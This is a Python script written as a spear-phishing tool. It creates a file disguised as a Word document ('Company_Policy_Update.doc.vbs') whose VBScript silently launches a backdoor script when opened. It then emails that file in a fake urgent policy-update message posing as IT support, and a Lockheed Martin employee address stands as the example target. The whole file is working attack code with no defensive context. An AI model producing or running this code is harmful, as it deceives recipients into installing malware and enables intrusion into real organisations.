import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def create_malicious_attachment(backdoor_script_path):
    """Creates a fake document that acts as the malicious attachment."""
    attachment_filename = "Company_Policy_Update.doc.vbs"
    with open(attachment_filename, "w") as f:
        f.write(f'CreateObject("WScript.Shell").Run "python {backdoor_script_path}", 0, True')
    return attachment_filename

def send_spear_phishing_email(target_email, attachment_path):
    """Sends a spear-phishing email with the malicious attachment."""
    from_email = "it.support@your-company-domain.com"
    password = "your_email_password" # Use an app password for security
    to_email = target_email

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = "Urgent: Company Policy Update"

    body = """
    Dear Employee,

    Please review the attached document for an important update to our company's remote work policy.

    This update is effective immediately.

    Best regards,
    IT Support
    """
    msg.attach(MIMEText(body, 'plain'))

    with open(attachment_path, "rb") as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
        msg.attach(part)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587) # Example with Gmail
        server.starttls()
        server.login(from_email, password)
        text = msg.as_string()
        server.sendmail(from_email, to_email, text)
        server.quit()
        print(f"Spear-phishing email sent to {target_email}")
    except Exception as e:
        print(f"Failed to send email: {e}")

if __name__ == "__main__":
    # Path to the backdoor script
    backdoor_script_path = os.path.abspath("custom_backdoor.py")
    
    # Create the malicious attachment
    attachment_filename = create_malicious_attachment(backdoor_script_path)

    # Target email address
    target_email = "employee@lockheedmartin.com" # Example target

    # Send the email
    send_spear_phishing_email(target_email, attachment_filename)

    # Clean up the attachment file
    os.remove(attachment_filename)
